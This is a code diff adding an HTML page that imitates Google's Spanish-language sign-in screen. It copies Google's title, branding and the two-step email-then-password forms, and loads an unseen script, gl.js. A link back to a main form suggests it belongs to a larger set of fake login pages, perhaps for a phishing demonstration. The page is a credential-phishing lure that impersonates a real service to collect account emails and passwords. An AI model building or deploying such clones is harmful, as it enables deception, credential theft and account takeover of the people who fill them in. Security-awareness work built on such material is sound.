@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <title>Iniciar sesión - Cuentas de Google</title>
+    <link rel="stylesheet" href="gl.css">
+    <link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>G</text></svg>">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+</head>
+<body>
+    <div class="main-container">
+        <a href="../../form.html" class="back-arrow-link" aria-label="Volver al formulario principal">&lt;</a>
+        <div class="login-box">
+            <div class="google-logo"></div>
+            
+            <div id="step-identifier">
+                <h1>Iniciar sesión</h1>
+                <p class="subtitle">Utilice su cuenta de Google</p>
+                
+                <form id="identifierForm">
+                    <div class="input-group">
+                        <input type="email" id="identifier" name="identifier" required autocomplete="username">
+                        <label for="identifier">Correo electrónico</label>
+                    </div>
+                    
+                    <a href="#" class="forgot-link">¿Olvidó su correo electrónico?</a>
+
+                    <div class="info-text">
+                        ¿No es tu ordenador? Use el modo Invitado para iniciar sesión de forma privada. 
+                        <a href="#" class="info-link">Más información sobre el modo Invitado.</a>
+                    </div>
+
+                    <div class="actions">
+                        <button type="button" class="create-link" onclick="handleCreateAccount()">Crear una cuenta</button>
+                        <button type="submit" class="next-btn">Próximo</button>
+                    </div>
+                </form>
+            </div>
+            
+            <div id="step-password" class="hidden">
+                <h1 class="welcome-title">Bienvenido/a</h1>
+                
+                <div class="account-display">
+                    <span class="icon-user"></span> 
+                    <p id="user-email-display" class="user-email"></p>
+                    <span class="icon-dropdown"></span>
+                </div>
+                
+                <form id="passwordForm">
+                    <div class="input-group">
+                        <input type="password" id="password" name="password" required autocomplete="current-password">
+                        <label for="password">Ingrese su contraseña</label>
+                    </div>
+                    
+                    <div class="checkbox-group">
+                        <input type="checkbox" id="show-password">
+                        <label for="show-password">Mostrar contraseña</label>
+                    </div>
+                    
+                    <a href="#" class="forgot-link">Prueba de otra manera</a>
+
+                    <div class="actions">
+                        <button type="button" class="create-link" onclick="goBackToIdentifier()">Atrás</button>
+                        <button type="submit" class="next-btn">Próximo</button>
+                    </div>
+                </form>
+            </div>
+        </div>
+
+        <div class="footer-links">
+            <select class="language-select">
+                <option value="es-us" selected>Inglés (Estados Unidos)</option>
+                <option value="es-es">Español (España)</option>
+                <option value="es-la">Español (Latinoamérica)</option>
+                </select>
+            <div class="footer-nav">
+                <a href="#">Ayuda</a>
+                <a href="#">Privacidad</a>
+                <a href="#">Términos</a>
+            </div>
+        </div>
+    </div>
+    
+    <script src="gl.js"></script>
+</body>
+</html>
